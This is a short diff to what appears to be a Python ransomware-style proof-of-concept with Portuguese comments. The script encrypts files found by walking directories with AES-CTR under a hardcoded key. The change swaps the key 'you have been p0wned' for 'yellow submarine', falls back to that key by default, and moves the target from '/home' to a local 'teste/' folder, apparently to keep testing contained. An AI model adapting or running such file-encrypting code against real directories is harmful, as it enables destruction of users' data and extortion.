@@ -11,7 +11,7 @@ import hue as Crypter
 # Altere se necessário
 # ----------------------
 
-HARDCODED_KEY = 'you have been p0wned'
+HARDCODED_KEY = 'yellow submarine'
 
 
 def get_parser():
@@ -43,11 +43,16 @@ def main():
             '''.format(HARDCODED_KEY))
         key = input('Digite a sua Chave > ')
 
+    else:
+        if HARDCODED_KEY:
+            key = HARDCODED_KEY
+
     ctr = Counter.new(128)
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
     # altere isto para a sua necessidade
-    startdirs = ['/home']
+    init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste/'))
+    startdirs = [init_path]
 
     for currentDir in startdirs:
         for filename in discovery.discover(currentDir):
